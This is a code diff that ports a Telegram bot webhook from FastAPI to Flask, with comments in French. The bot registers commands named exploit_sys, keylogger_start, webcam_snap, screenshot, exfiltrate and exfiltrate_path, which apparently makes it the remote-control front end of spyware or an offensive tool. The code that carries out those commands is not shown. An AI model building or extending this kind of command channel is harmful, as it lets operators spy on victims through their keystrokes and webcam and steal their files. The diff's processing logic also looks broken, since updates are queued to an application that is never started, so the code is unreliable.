@@ -1,34 +1,33 @@
 # telegram/webhook.py
 
 import os
-from fastapi import APIRouter, Request, Header, HTTPException
+import json
+from flask import Blueprint, request, abort
 from telegram import Update
-from telegram.ext import ApplicationBuilder
+from telegram.ext import ApplicationBuilder, CommandHandler
 from modules.utils import get_api_keys
 from modules.telegram_bot import menu, osint, scan, exploit_sys, screenshot, keylogger_start, webcam_snap, exfiltrate, exfiltrate_path, rapport
 
+# 🔐 Chargement des clés API
 api = get_api_keys()
-
 TOKEN = api.get("TELEGRAM_BOT_TOKEN")
 SECRET_TOKEN = api.get("TELEGRAM_SECRET_TOKEN")
 
-router = APIRouter()
+telegram_webhook = Blueprint("telegram_webhook", __name__)
 
-@router.post("/telegram/webhook")
-async def telegram_webhook(
-    request: Request,
-    x_telegram_bot_api_secret_token: str = Header(None)
-):
-    if SECRET_TOKEN and x_telegram_bot_api_secret_token != SECRET_TOKEN:
-        raise HTTPException(status_code=403, detail="⛔ Jeton secret invalide.")
+@telegram_webhook.route("/telegram/webhook", methods=["POST"])
+def handle_webhook():
+    # ✅ Vérification du header secret (sécurité)
+    header_token = request.headers.get("X-Telegram-Bot-Api-Secret-Token")
+    if SECRET_TOKEN and header_token != SECRET_TOKEN:
+        abort(403, description="⛔ Jeton secret invalide")
 
     try:
-        data = await request.json()
+        data = request.get_json()
         update = Update.de_json(data, ApplicationBuilder().token(TOKEN).build().bot)
 
-        # Construction manuelle de l'application pour traiter la commande
+        # 🧠 Création de l'application et ajout des handlers
         app = ApplicationBuilder().token(TOKEN).build()
-
         app.add_handler(CommandHandler("menu", menu))
         app.add_handler(CommandHandler("osint", osint))
         app.add_handler(CommandHandler("scan", scan))
@@ -40,8 +39,10 @@ async def telegram_webhook(
         app.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
         app.add_handler(CommandHandler("rapport", rapport))
 
-        await app.process_update(update)
+        # ⚙️ Traitement de la mise à jour
+        app.update_queue.put_nowait(update)
+
         return {"status": "ok"}
 
     except Exception as e:
-        raise HTTPException(status_code=500, detail=f"Erreur webhook: {e}")
+        abort(500, description=f"❌ Erreur webhook : {str(e)}")
